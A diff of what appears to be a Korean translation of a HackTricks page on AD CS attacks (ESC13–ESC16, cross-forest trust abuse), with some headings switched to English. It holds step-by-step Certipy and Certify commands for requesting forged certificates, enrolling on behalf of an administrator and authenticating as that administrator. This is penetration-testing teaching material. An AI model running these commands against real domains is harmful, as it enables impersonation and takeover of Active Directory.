@@ -589,7 +629,7 @@ $ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common 
 
 ### 설명
 
-`msPKI-Certificate-Policy` 속성은 발급 정책을 인증서 템플릿에 추가할 수 있게 합니다. 정책을 발급하는 책임이 있는 `msPKI-Enterprise-Oid` 객체는 PKI OID 컨테이너의 구성 명명 컨텍스트(CN=OID,CN=Public Key Services,CN=Services)에서 발견할 수 있습니다. 정책은 이 객체의 `msDS-OIDToGroupLink` 속성을 사용하여 AD 그룹에 연결될 수 있으며, 이를 통해 시스템은 인증서를 제시하는 사용자가 그룹의 구성원인 것처럼 권한을 부여할 수 있습니다. [여기 참조](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
+`msPKI-Certificate-Policy` 속성은 발급 정책을 인증서 템플릿에 추가할 수 있게 해줍니다. 정책을 발급하는 책임이 있는 `msPKI-Enterprise-Oid` 객체는 PKI OID 컨테이너의 구성 명명 컨텍스트(CN=OID,CN=Public Key Services,CN=Services)에서 발견할 수 있습니다. 정책은 이 객체의 `msDS-OIDToGroupLink` 속성을 사용하여 AD 그룹에 연결될 수 있으며, 이를 통해 시스템은 인증서를 제시하는 사용자가 그룹의 구성원인 것처럼 권한을 부여할 수 있습니다. [여기 참조](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).
 
 다시 말해, 사용자가 인증서를 등록할 수 있는 권한이 있고 인증서가 OID 그룹에 연결되어 있을 때, 사용자는 이 그룹의 권한을 상속받을 수 있습니다.
 
@@ -625,15 +665,15 @@ OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
 ```bash
 certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
 ```
-## 취약한 인증서 갱신 구성 - ESC14
+## Vulnerable Certificate Renewal Configuration- ESC14
 
-### 설명
+### Explanation
 
-https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping 에 있는 설명은 매우 철저합니다. 아래는 원본 텍스트의 인용입니다.
+The description at https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping is remarkably thorough. Below is a quotation of the original text.
 
 ESC14는 "약한 명시적 인증서 매핑"에서 발생하는 취약점을 다루며, 주로 Active Directory 사용자 또는 컴퓨터 계정의 `altSecurityIdentities` 속성의 오용 또는 안전하지 않은 구성으로 인해 발생합니다. 이 다중 값 속성은 관리자가 인증 목적으로 AD 계정과 X.509 인증서를 수동으로 연결할 수 있도록 합니다. 채워지면, 이러한 명시적 매핑은 일반적으로 인증서의 SAN에 있는 UPN 또는 DNS 이름, 또는 `szOID_NTDS_CA_SECURITY_EXT` 보안 확장에 내장된 SID에 의존하는 기본 인증서 매핑 논리를 무시할 수 있습니다.
 
-"약한" 매핑은 `altSecurityIdentities` 속성 내에서 인증서를 식별하는 데 사용되는 문자열 값이 너무 광범위하거나 쉽게 추측 가능하며, 고유하지 않은 인증서 필드에 의존하거나 쉽게 스푸핑할 수 있는 인증서 구성 요소를 사용할 때 발생합니다. 공격자가 특권 계정에 대한 이러한 약하게 정의된 명시적 매핑과 일치하는 속성을 가진 인증서를 얻거나 제작할 수 있다면, 그 인증서를 사용하여 해당 계정으로 인증하고 가장할 수 있습니다.
+"약한" 매핑은 `altSecurityIdentities` 속성 내에서 인증서를 식별하는 데 사용되는 문자열 값이 너무 광범위하거나 쉽게 추측 가능하거나 고유하지 않은 인증서 필드에 의존하거나 쉽게 스푸핑할 수 있는 인증서 구성 요소를 사용할 때 발생합니다. 공격자가 특권 계정에 대한 이러한 약하게 정의된 명시적 매핑과 일치하는 속성을 가진 인증서를 얻거나 제작할 수 있다면, 그 인증서를 사용하여 해당 계정으로 인증하고 가장할 수 있습니다.
 
 잠재적으로 약한 `altSecurityIdentities` 매핑 문자열의 예는 다음과 같습니다:
 
@@ -650,14 +690,13 @@ ESC14는 "약한 명시적 인증서 매핑"에서 발생하는 취약점을 다
 - `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (인증서의 원시 공개 키의 SHA1 해시로 매핑 - 일반적으로 강력함)
 
 이러한 매핑의 보안은 매핑 문자열에 사용된 선택된 인증서 식별자의 구체성, 고유성 및 암호화 강도에 크게 의존합니다. 도메인 컨트롤러에서 강력한 인증서 바인딩 모드가 활성화되어 있더라도(주로 SAN UPN/DNS 및 SID 확장을 기반으로 한 암묵적 매핑에 영향을 미침), 잘못 구성된 `altSecurityIdentities` 항목은 매핑 논리가 결함이 있거나 너무 관대할 경우 여전히 가장을 위한 직접적인 경로를 제공할 수 있습니다.
+### Abuse Scenario
 
-### 남용 시나리오
+ESC14는 Active Directory(AD)의 **명시적 인증서 매핑**을 목표로 하며, 특히 `altSecurityIdentities` 속성을 다룹니다. 이 속성이 설정되어 있으면(설계상 또는 잘못 구성된 경우), 공격자는 매핑과 일치하는 인증서를 제시하여 계정을 가장할 수 있습니다.
 
-ESC14는 Active Directory(AD)의 **명시적 인증서 매핑**을 목표로 하며, 특히 `altSecurityIdentities` 속성을 다룹니다. 이 속성이 설정되어 있으면(설계 또는 잘못된 구성으로 인해), 공격자는 매핑과 일치하는 인증서를 제시하여 계정을 가장할 수 있습니다.
+#### Scenario A: Attacker Can Write to `altSecurityIdentities`
 
-#### 시나리오 A: 공격자가 `altSecurityIdentities`에 쓸 수 있음
-
-**전제 조건**: 공격자는 대상 계정의 `altSecurityIdentities` 속성에 대한 쓰기 권한이 있거나 다음 권한 중 하나의 형태로 이를 부여할 수 있는 권한이 있습니다:
+**Precondition**: 공격자는 대상 계정의 `altSecurityIdentities` 속성에 대한 쓰기 권한이 있거나 다음 권한 중 하나의 형태로 이를 부여할 수 있는 권한이 있습니다:
 - 속성 `altSecurityIdentities` 쓰기
 - 속성 `Public-Information` 쓰기
 - 속성(모두) 쓰기
@@ -666,23 +705,19 @@ ESC14는 Active Directory(AD)의 **명시적 인증서 매핑**을 목표로 하
 - `GenericWrite`
 - `GenericAll`
 - 소유자*.
+#### Scenario B: Target Has Weak Mapping via X509RFC822 (Email)
 
-#### 시나리오 B: 대상이 X509RFC822(이메일)를 통한 약한 매핑을 가짐
+- **Precondition**: 대상은 altSecurityIdentities에 약한 X509RFC822 매핑을 가지고 있습니다. 공격자는 피해자의 메일 속성을 대상의 X509RFC822 이름과 일치하도록 설정하고, 피해자로서 인증서를 등록한 후 이를 사용하여 대상 계정으로 인증할 수 있습니다.
+#### Scenario C: Target Has X509IssuerSubject Mapping
 
-- **전제 조건**: 대상은 `altSecurityIdentities`에 약한 X509RFC822 매핑을 가지고 있습니다. 공격자는 피해자의 메일 속성을 대상의 X509RFC822 이름과 일치하도록 설정하고, 피해자로서 인증서를 등록한 후 이를 사용하여 대상 계정으로 인증할 수 있습니다.
+- **Precondition**: 대상은 `altSecurityIdentities`에 약한 X509IssuerSubject 명시적 매핑을 가지고 있습니다. 공격자는 피해자 주체의 `cn` 또는 `dNSHostName` 속성을 대상의 X509IssuerSubject 매핑의 주체와 일치하도록 설정할 수 있습니다. 그런 다음, 공격자는 피해자로서 인증서를 등록하고 이 인증서를 사용하여 대상 계정으로 인증할 수 있습니다.
+#### Scenario D: Target Has X509SubjectOnly Mapping
 
-#### 시나리오 C: 대상이 X509IssuerSubject 매핑을 가짐
+- **Precondition**: 대상은 `altSecurityIdentities`에 약한 X509SubjectOnly 명시적 매핑을 가지고 있습니다. 공격자는 피해자 주체의 `cn` 또는 `dNSHostName` 속성을 대상의 X509SubjectOnly 매핑의 주체와 일치하도록 설정할 수 있습니다. 그런 다음, 공격자는 피해자로서 인증서를 등록하고 이 인증서를 사용하여 대상 계정으로 인증할 수 있습니다.
+### concrete operations
+#### Scenario A
 
-- **전제 조건**: 대상은 `altSecurityIdentities`에 약한 X509IssuerSubject 명시적 매핑을 가지고 있습니다. 공격자는 피해자 주체의 `cn` 또는 `dNSHostName` 속성을 대상의 X509IssuerSubject 매핑의 주체와 일치하도록 설정할 수 있습니다. 그런 다음, 공격자는 피해자로서 인증서를 등록하고 이 인증서를 사용하여 대상 계정으로 인증할 수 있습니다.
-
-#### 시나리오 D: 대상이 X509SubjectOnly 매핑을 가짐
-
-- **전제 조건**: 대상은 `altSecurityIdentities`에 약한 X509SubjectOnly 명시적 매핑을 가지고 있습니다. 공격자는 피해자 주체의 `cn` 또는 `dNSHostName` 속성을 대상의 X509SubjectOnly 매핑의 주체와 일치하도록 설정할 수 있습니다. 그런 다음, 공격자는 피해자로서 인증서를 등록하고 이 인증서를 사용하여 대상 계정으로 인증할 수 있습니다.
-
-### 구체적인 작업
-#### 시나리오 A
-
-인증서 템플릿 `Machine`의 인증서를 요청합니다.
+Request a certificate of the certificate template `Machine`
 ```bash
 .\Certify.exe request /ca:<ca> /template:Machine /machine
 ```
@@ -706,7 +741,7 @@ Remove-AltSecIDMapping -DistinguishedName "CN=TargetUserA,CN=Users,DC=external,D
 
 https://trustedsec.com/blog/ekuwu-not-just-another-ad-cs-esc의 설명은 매우 철저합니다. 아래는 원본 텍스트의 인용입니다.
 
-기본 제공되는 버전 1 인증서 템플릿을 사용하여 공격자는 템플릿에 지정된 구성된 확장 키 사용 속성보다 선호되는 애플리케이션 정책을 포함하는 CSR을 작성할 수 있습니다. 유일한 요구 사항은 등록 권한이며, 이를 사용하여 **_WebServer_** 템플릿을 사용하여 클라이언트 인증, 인증서 요청 에이전트 및 코드 서명 인증서를 생성할 수 있습니다.
+내장된 기본 버전 1 인증서 템플릿을 사용하여 공격자는 템플릿에 지정된 구성된 확장 키 사용 속성보다 선호되는 애플리케이션 정책을 포함하는 CSR을 작성할 수 있습니다. 유일한 요구 사항은 등록 권한이며, 이를 사용하여 **_WebServer_** 템플릿을 사용하여 클라이언트 인증, 인증서 요청 에이전트 및 코드 서명 인증서를 생성할 수 있습니다.
 
 ### 남용
 
@@ -745,9 +780,9 @@ certipy req \
 -ca 'CORP-CA' -template 'WebServer' \
 -application-policies 'Certificate Request Agent'
 ```
-- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`를 주입합니다.
+- `-application-policies 'Certificate Request Agent'`: OID `1.3.6.1.4.1.311.20.2.1`을 주입합니다.
 
-**2단계: "agent" 인증서를 사용하여 대상 권한이 있는 사용자 대신 인증서를 요청합니다.** 이는 1단계의 인증서를 에이전트 인증서로 사용하는 ESC3와 유사한 단계입니다.
+**2단계: "agent" 인증서를 사용하여 대상 권한이 있는 사용자 대신 인증서를 요청합니다.** 이는 1단계에서 가져온 인증서를 에이전트 인증서로 사용하는 ESC3와 유사한 단계입니다.
 ```bash
 certipy req \
 -u 'attacker@corp.local' -p 'Passw0rd!' \
@@ -800,7 +835,7 @@ certipy shadow \
 -dc-ip '10.0.0.100' -account 'victim' \
 auto
 ```
-**4단계: ESC16 취약한 CA에서 _적절한 클라이언트 인증 템플릿_ (예: "User")을 사용하여 "희생자" 사용자로 인증서를 요청합니다.** CA가 ESC16에 취약하기 때문에, 템플릿의 특정 설정과 관계없이 발급된 인증서에서 SID 보안 확장을 자동으로 생략합니다. Kerberos 자격 증명 캐시 환경 변수를 설정합니다 (셸 명령):
+**4단계: ESC16 취약한 CA에서 _적합한 클라이언트 인증 템플릿_ (예: "User")으로 "희생자" 사용자로 인증서를 요청합니다.** CA가 ESC16에 취약하기 때문에, 템플릿의 특정 설정과 관계없이 발급된 인증서에서 SID 보안 확장을 자동으로 생략합니다. Kerberos 자격 증명 캐시 환경 변수를 설정합니다 (셸 명령):
 ```bash
 export KRB5CCNAME=victim.ccache
 ```
@@ -824,18 +859,22 @@ certipy auth \
 -dc-ip '10.0.0.100' -pfx 'administrator.pfx' \
 -username 'administrator' -domain 'corp.local'
 ```
-## 인증서로 숲을 타락시키는 방법 설명 (수동태)
+## Compromising Forests with Certificates Explained in Passive Voice
 
-### 손상된 CA에 의한 숲 신뢰의 파괴
+### Breaking of Forest Trusts by Compromised CAs
 
-**교차 숲 등록**을 위한 구성은 상대적으로 간단하게 이루어집니다. **리소스 숲의 루트 CA 인증서**는 관리자가 **계정 숲에 게시**하고, **리소스 숲의 엔터프라이즈 CA** 인증서는 **각 계정 숲의 `NTAuthCertificates` 및 AIA 컨테이너에 추가**됩니다. 이 arrangement는 **리소스 숲의 CA가 PKI를 관리하는 모든 다른 숲에 대한 완전한 제어권**을 부여합니다. 만약 이 CA가 **공격자에 의해 손상된다면**, 리소스 및 계정 숲의 모든 사용자에 대한 인증서가 **그들에 의해 위조될 수 있으며**, 이는 숲의 보안 경계를 깨뜨리게 됩니다.
+**크로스 포리스트 등록**을 위한 구성은 상대적으로 간단하게 이루어집니다. **리소스 포리스트의 루트 CA 인증서**는 관리자가 **계정 포리스트에 게시**하고, **리소스 포리스트의 엔터프라이즈 CA** 인증서는 **각 계정 포리스트의 `NTAuthCertificates` 및 AIA 컨테이너에 추가**됩니다. 이 arrangement는 **리소스 포리스트의 CA가 PKI를 관리하는 모든 다른 포리스트에 대한 완전한 제어**를 부여합니다. 만약 이 CA가 **공격자에 의해 손상된다면**, 리소스 및 계정 포리스트의 모든 사용자에 대한 인증서를 **위조할 수 있습니다**, 이로 인해 포리스트의 보안 경계가 깨지게 됩니다.
 
-### 외부 주체에게 부여된 등록 권한
+### Enrollment Privileges Granted to Foreign Principals
 
-다중 숲 환경에서는 **인증된 사용자 또는 외부 주체**(엔터프라이즈 CA가 속한 숲 외부의 사용자/그룹)의 **등록 및 편집 권한**을 허용하는 인증서 템플릿을 **게시하는 엔터프라이즈 CA**에 대해 주의가 필요합니다.\
-신뢰를 통해 인증이 이루어지면, **인증된 사용자 SID**가 AD에 의해 사용자의 토큰에 추가됩니다. 따라서, 도메인에 **인증된 사용자 등록 권한을 허용하는 템플릿**이 있는 엔터프라이즈 CA가 있다면, **다른 숲의 사용자가 템플릿에 등록될 수 있는 가능성이 있습니다**. 마찬가지로, **템플릿에 의해 외부 주체에게 명시적으로 등록 권한이 부여된다면**, **교차 숲 접근 제어 관계가 생성되어**, 한 숲의 주체가 **다른 숲의 템플릿에 등록할 수 있게 됩니다**.
+다중 포리스트 환경에서는 **인증된 사용자 또는 외부 주체**(엔터프라이즈 CA가 속한 포리스트 외부의 사용자/그룹)에게 **등록 및 편집 권한**을 허용하는 인증서 템플릿을 **게시하는 엔터프라이즈 CA**에 대해 주의가 필요합니다.\
+신뢰를 통해 인증이 이루어지면, **인증된 사용자 SID**가 AD에 의해 사용자의 토큰에 추가됩니다. 따라서 도메인에 **인증된 사용자 등록 권한을 허용하는 템플릿**이 있는 엔터프라이즈 CA가 있다면, **다른 포리스트의 사용자가 템플릿에 등록할 수 있습니다**. 마찬가지로, **템플릿에 의해 외부 주체에게 명시적으로 등록 권한이 부여되면**, **크로스 포리스트 접근 제어 관계가 생성**되어 한 포리스트의 주체가 **다른 포리스트의 템플릿에 등록할 수 있게 됩니다**.
 
-두 시나리오는 한 숲에서 다른 숲으로의 **공격 표면 증가**로 이어집니다. 인증서 템플릿의 설정은 공격자가 외부 도메인에서 추가 권한을 얻기 위해 악용될 수 있습니다.
+두 시나리오는 한 포리스트에서 다른 포리스트로의 **공격 표면 증가**로 이어집니다. 공격자는 인증서 템플릿의 설정을 악용하여 외부 도메인에서 추가 권한을 얻을 수 있습니다.
 
+
+## References
+
+- [Certify 2.0 – SpecterOps Blog](https://specterops.io/blog/2025/08/11/certify-2-0/)
 
 {{#include ../../../banners/hacktricks-training.md}}
